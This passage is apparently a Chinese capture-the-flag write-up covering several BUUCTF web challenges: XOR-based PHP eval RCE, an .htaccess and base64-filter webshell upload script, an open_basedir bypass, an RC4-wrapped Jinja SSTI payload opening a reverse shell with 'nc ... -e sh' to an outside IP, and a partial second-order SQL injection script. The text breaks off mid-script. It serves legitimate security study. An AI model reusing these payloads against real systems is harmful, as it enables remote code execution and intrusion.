<p>代码很少，这里给了我们一个eval函数和一个<code>get_the_flag</code>方法，想也不用想，是要我们用eval去调用这个方法<br>那我们该如果去执行命令呢，bypass了这么多字母，这里就考一个无数字字母rce，先FUZZ一下我们的可用字符：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot;\t&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669094557565-49b74897-5f92-4fd7-94f0-a397c1e562e3.png#averageHue=%23eae8e6&clientId=uc8946735-6892-4&from=paste&height=98&id=u213591f3&name=image.png&originHeight=123&originWidth=1771&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11046&status=done&style=none&taskId=u073014ff-4516-423b-8429-1e1988902bc&title=&width=1416.8" alt="image.png"><br><code>! # $ % ( ) * + - / : ; &lt; &gt; ? @ \ ] ^ &#123; &#125; </code>和一些<strong>不可见字符</strong>，不要觉得不可见字符没用，有用滴捏，我们写个脚本来通过一关：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $dict=&quot;! # $ % ( ) * + - / : ; &lt; &gt; ? @ \ ] ^ &#123; &#125;&quot;;</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$payload</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;=<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">		<span class="variable">$str</span>=<span class="title function_ invoke__">chr</span>(<span class="number">246</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$str</span>==<span class="variable">$payload</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">			<span class="variable">$res</span>.=<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">			<span class="comment">// echo $res;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]:&#x27;</span>.<span class="string">&#x27;%f6%f6%f6%f6&#x27;</span>.<span class="string">&#x27;^&#x27;</span>.<span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个脚本是为了得到<code>_GET</code>字符串的，遍历一边字符，与%f6进行异或，也可以选其他不可见字符，都可以<br>最后得到payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%f6%f6%f6%f6^%a9%b1%b3%a2&#125;&#123;%f6&#125;();&amp;%f6=phpinfo</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669094819301-ac78938e-bd3b-47e0-ae77-e7253f0aa14b.png#averageHue=%239e9d9d&clientId=uc8946735-6892-4&from=paste&height=426&id=u4492f766&name=image.png&originHeight=533&originWidth=1803&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63409&status=done&style=none&taskId=u28702386-5d91-4680-a25a-a94658c4b60&title=&width=1442.4" alt="image.png"><br>这里已经得到了flag，但这是buu靶场的失误，我们继续按着预期走<br>接下来审视一下get_the_flag方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先创建了一个文件夹，用我们的Ipmd5加密后来命名<br>之后对上传的文件进行验证，有个文件头检测，需要为图片类型，这里可以用以下方法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">\x00\x00\x8a\x39\x8a\x39</span><br><span class="line"><span class="comment">#define width 1337</span></span><br><span class="line"><span class="comment">#define height 1337 </span></span><br><span class="line"><span class="comment">#上面2个defined是一起传的</span></span><br></pre></td></tr></table></figure>
<p>之后再对文件内容进行判断，不能有<code>&lt;?</code>这就限制了我们，这边也有2种思路，一种是短标签绕过，另一种是使用htacess+filter对解析的内容进行一次base64解码<br>短标签绕过就用<br><code>&lt;script language=&quot;php&quot;&gt;echo &#39;123&#39;; &lt;/script&gt;</code><br>htaccess文件绕过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=xxxx.png&quot;</span></span><br></pre></td></tr></table></figure>
<p>我们的htaccess文件和图片木马都要记得加上个文件头来绕过哦，锻炼一下写脚本的能力，写了个py脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://983cc47b-3998-4c23-b8e8-4d3e0267e2cd.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">padding=<span class="string">&quot;?_=$&#123;%f6%f6%f6%f6^%a9%b1%b3%a2&#125;&#123;%f6&#125;();&amp;%f6=get_the_flag&quot;</span></span><br><span class="line">test_content=<span class="string">b&#x27;&#x27;&#x27;GIF89a</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.cc&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">hta_content=<span class="string">b&#x27;&#x27;&#x27;\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.cc&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">file_content=<span class="string">b&quot;GIF89a&quot;</span>+<span class="string">b&quot;00&quot;</span>+base64.b64encode(<span class="string">b&quot;&lt;?php eval($_POST[&#x27;pop&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">hta_file=[(<span class="string">&#x27;file&#x27;</span>,(<span class="string">&#x27;.htaccess&#x27;</span>,hta_content,<span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">file=[(<span class="string">&#x27;file&#x27;</span>,(<span class="string">&#x27;1.cc&#x27;</span>,file_content,<span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">test=[(<span class="string">&#x27;file&#x27;</span>,(<span class="string">&#x27;test.txt&#x27;</span>,test_content,<span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">r1=requests.post(url=url+padding,files=hta_file)</span><br><span class="line">r2=requests.post(url=url+padding,files=file)</span><br><span class="line">r3=requests.post(url=url+padding,files=test)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669098666239-ed319ba6-e4c2-4876-a1d3-25808a6f6bde.png#averageHue=%23988062&clientId=ue69e9ef4-137c-4&from=paste&height=49&id=uf9be181d&name=image.png&originHeight=61&originWidth=644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11613&status=done&style=none&taskId=u71c2f71b-4d10-4b10-9854-41144b480e4&title=&width=515.2" alt="image.png"><br>访问这个文件就可以进行RCE了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669098706663-effef86b-1da3-472d-affd-6f86d67649da.png#averageHue=%23767574&clientId=ue69e9ef4-137c-4&from=paste&height=525&id=u1140c59a&name=image.png&originHeight=656&originWidth=1767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120651&status=done&style=none&taskId=u031ac2ac-5b34-4419-b71a-cf1b55dbcdc&title=&width=1413.6" alt="image.png"><br>这里一方面设置了disabled_function，另一方面设置了个：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669098727925-5a601198-4f12-4119-9315-c86db452bfb9.png#averageHue=%23d09d63&clientId=ue69e9ef4-137c-4&from=paste&height=82&id=u596183b3&name=image.png&originHeight=102&originWidth=1239&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10870&status=done&style=none&taskId=u256aee8a-3f00-451d-8e78-da07eda327c&title=&width=991.2" alt="image.png"><br>openbasedir，要绕过这两个又有2种思路<br>一个是使用蚁剑的插件绕过disabled_function<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669098822100-0cd7f76a-68ce-4ef3-950c-eac97b1e2320.png#averageHue=%23f1f1f1&clientId=ue69e9ef4-137c-4&from=paste&height=513&id=u5813a44a&name=image.png&originHeight=641&originWidth=898&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57664&status=done&style=none&taskId=u4888a372-ecbf-41d8-8819-ffb3b84acd6&title=&width=718.4" alt="image.png"><br>另一种学习一下：<br><code>?cmd=mkdir(&#39;rot&#39;);chdir(&#39;rot&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(glob(&#39;*&#39;));</code><br>这样就可以查看根目录下的文件，最后用file_get_contents去读取<br>有关更多的bypass查看：<br>另外假如大家对我们的<code>\x00\x00\x8a\x39\x8a\x39</code>有兴趣，我也看了看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669098979577-e6f2d697-02ea-4dc4-9d4f-b1db12050953.png#averageHue=%23f5f4f3&clientId=ue69e9ef4-137c-4&from=paste&height=122&id=ub3d97dec&name=image.png&originHeight=153&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16495&status=done&style=none&taskId=u71fa6b1d-d68f-427f-9da0-49ee2810581&title=&width=901.6" alt="image.png"><br>我知识浅薄看不出是什么的文件头，不过应该是JPEG的？</p>
<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>考点：RC4加密，SSTI注入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669180843608-8fbbe1ec-672e-4dd2-969f-c82a64f2efd9.png#averageHue=%23eacda2&clientId=u4c1a8a1d-a15a-4&from=paste&height=156&id=u1011260f&name=image.png&originHeight=195&originWidth=999&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11023&status=done&style=none&taskId=u35d3f601-87e8-42c3-b693-6b304c5d70b&title=&width=799.2" alt="image.png"><br>dirsearch开扫只找到了一个robots.txt，打开后为：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669180872054-4cd44025-726d-4ec5-a145-2e064f7991b5.png#averageHue=%23efdfb6&clientId=u4c1a8a1d-a15a-4&from=paste&height=92&id=u5ed2736e&name=image.png&originHeight=115&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10400&status=done&style=none&taskId=ueb2f0490-5eb4-4202-bee5-0c068a8616c&title=&width=928" alt="image.png"><br>没什么几把卵用，所以我们继续分析首页的secret，经过一系列的测试发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669180892081-695e3475-5089-40af-b6cd-47e907e77f2b.png#averageHue=%23fbfbe0&clientId=u4c1a8a1d-a15a-4&from=paste&height=65&id=u0366fc7d&name=image.png&originHeight=81&originWidth=1000&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11019&status=done&style=none&taskId=ue6cd569e-2d0d-4794-a40b-7aa4a2e64bb&title=&width=800" alt="image.png"><br>猜测需要传参，参数为secret：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669180904562-6beaf057-c54c-47e8-a16a-6bf572276bdf.png#averageHue=%23fafae9&clientId=u4c1a8a1d-a15a-4&from=paste&height=62&id=u1622cf00&name=image.png&originHeight=78&originWidth=1108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8799&status=done&style=none&taskId=u6650e609-535e-44aa-b67b-d3d7e0487a7&title=&width=886.4" alt="image.png"><br>你每次输入不同的数字都会返回一个不同的字母或者数字，这边瞎搞搞看到了报错信息：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669180945015-79cbf5de-f8ad-41c8-a478-a0b1de6e7dd2.png#averageHue=%23fdfcfc&clientId=u4c1a8a1d-a15a-4&from=paste&height=323&id=ub8358f2c&name=image.png&originHeight=404&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28384&status=done&style=none&taskId=ua76f7162-e8ef-429e-8dfb-48ca3f50d46&title=&width=1536" alt="image.png"><br>看到了RC4敏感字样，并且还贴心的告诉我们是解密，也就是说，网页会把我们输入的secret参数进行一次rc4解密，并且密钥已经告诉我们了就是<code>HereIsTreasure</code>，在网上找了个大佬的脚本，并且自己也分析了一遍：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment"># print(&quot;加密后的字符串是：%s&quot; %cipher)</span></span><br><span class="line">    <span class="comment"># print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment"># print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;nc 43.140.251.169 7777 -e sh&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>有关rc4的加密原理可以看：</p>
<p>然后可以看到源码中有这样一个过滤：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669181119247-48f2eb40-9c9c-416b-b041-a7ede0ce2469.png#averageHue=%23fdfcfc&clientId=u4c1a8a1d-a15a-4&from=paste&height=123&id=u791b9e3c&name=image.png&originHeight=154&originWidth=556&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4467&status=done&style=none&taskId=uae42ac07-bff6-4afc-95ed-71485041d1c&title=&width=444.8" alt="image.png"><br>所以直接去cat flag是会被检测出来的，这里我使用了反弹shell，我还想得出来的方法有用base64等加密方式对其进行加密输出：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669181147469-30f4d157-b63a-4654-9c3e-413744b13c00.png#averageHue=%233b3b3a&clientId=u4c1a8a1d-a15a-4&from=paste&height=178&id=u578e6329&name=image.png&originHeight=222&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8912&status=done&style=none&taskId=u07eaf18b-ac59-43e4-aa85-b9e8fbd832b&title=&width=524" alt="image.png"><br>最后也是得出了flag</p>
<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>考点：SQL二次注入,逗号过滤<br>只能说不愧是网鼎杯<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669267514823-2f5ccd92-8cd3-4994-92e3-8aefa25c4ffd.png#averageHue=%23937f69&clientId=u7e8b7983-b86f-4&from=paste&height=423&id=u84f2951f&name=image.png&originHeight=529&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38056&status=done&style=none&taskId=u67dd583c-1c02-4535-beb8-681b720c171&title=&width=1536" alt="image.png"><br>由于是在BUU做的题，扫目录会429，这点让我太烦了，可以扫出来有一个<code>register.php</code>的，虽然也可以猜出来，但是还是扫实在点啊<br>在register界面有个小Tips，如果我们的username符合规则就会302跳转到登录界面，如果语法有错就是原地200，如果被ban了就是200然后底部会有一个nonono！<br>通过这三点可以知道该用什么payload<br>也是经过了一系列的fuzz啊，发现ban掉了逗号，information<br>所以呢，该怎么写呢，这里又get到了一个新知识：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669267691561-d63cbdc2-5c0a-4dba-a99e-886f9f812035.png#averageHue=%23191818&clientId=u7e8b7983-b86f-4&from=paste&height=170&id=u20a90477&name=image.png&originHeight=212&originWidth=548&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10149&status=done&style=none&taskId=ubcf4ea81-cd1c-4ae4-b343-9ab9fada29d&title=&width=438.4" alt="image.png"><br>输入<code>select &#39;&#39;+database()+&#39;&#39;;</code>返回的是0，然而输入<br><code> select &#39;&#39;+hex(database())+&#39;&#39;;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669267733266-8a1c62f6-eef0-47d2-9d96-76c17295b6fc.png#averageHue=%23141313&clientId=u7e8b7983-b86f-4&from=paste&height=113&id=u4bcc8c3c&name=image.png&originHeight=141&originWidth=585&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6288&status=done&style=none&taskId=u592809fd-471f-4832-be31-05f10bd6d80&title=&width=468" alt="image.png"><br>这里为什么是6呢？是因为后面有字母被截断了，加号只可以数字相加嘛<br>假如我们输入<code> select &#39;&#39;+hex(hex(database()))+&#39;&#39;;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669267865425-712f2a3a-1c55-42d3-a607-d134cd660615.png#averageHue=%2311100f&clientId=u7e8b7983-b86f-4&from=paste&height=134&id=u73a1669a&name=image.png&originHeight=168&originWidth=533&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8758&status=done&style=none&taskId=u3eb6aa9f-02bd-47f6-8f4f-25c7f78552b&title=&width=426.4" alt="image.png"><br>双层hex加密，这样暂时来看是没问题的，但是假如我们的回显更加的长一些呢？<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669267892654-39de7617-c7c1-48cc-92b6-1abae908acdc.png#averageHue=%231b1a19&clientId=u7e8b7983-b86f-4&from=paste&height=122&id=ud155e530&name=image.png&originHeight=153&originWidth=779&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7858&status=done&style=none&taskId=udb7c09f6-2617-4bad-94fa-35d76d3433c&title=&width=623.2" alt="image.png"><br>可以发现他变成了科学计数法，因此需要用到<code>substr</code>去截取这个回显：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669267925948-e762f02b-652b-45bc-9507-3d08bda0854c.png#averageHue=%23191716&clientId=u7e8b7983-b86f-4&from=paste&height=130&id=u25bfe571&name=image.png&originHeight=163&originWidth=988&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10941&status=done&style=none&taskId=u709448d8-cb52-497a-9fb3-6be88aabf79&title=&width=790.4" alt="image.png"><br>这里又有个新tips<code>substr(xxx,from x for x)</code>，由于逗号被ban了，我们可以使用substr的这个语句，information库被过滤了，所以我尝试了用mysql和sys库，但都以失败告终，这是因为这2个库是在mysql5.7后新增的，靶场的mysql版本可能是更低的<br>因此只可以猜测flag在<code>flag</code>表中，并且里面只有一行内容：<br>据此写一个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">url1=<span class="string">&quot;http://06876111-a393-4b31-a99e-f67d25fb4fa2.node4.buuoj.cn:81/register.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://06876111-a393-4b31-a99e-f67d25fb4fa2.node4.buuoj.cn:81/login.php&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">res=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    j = randint(<span class="number">1000</span>, <span class="number">2000</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        data1 = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;j&#125;</span>&quot;</span> + <span class="string">&quot;@qq.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;&#x27;+substr(hex(hex((select * from flag)))from <span class="subst">&#123;<span 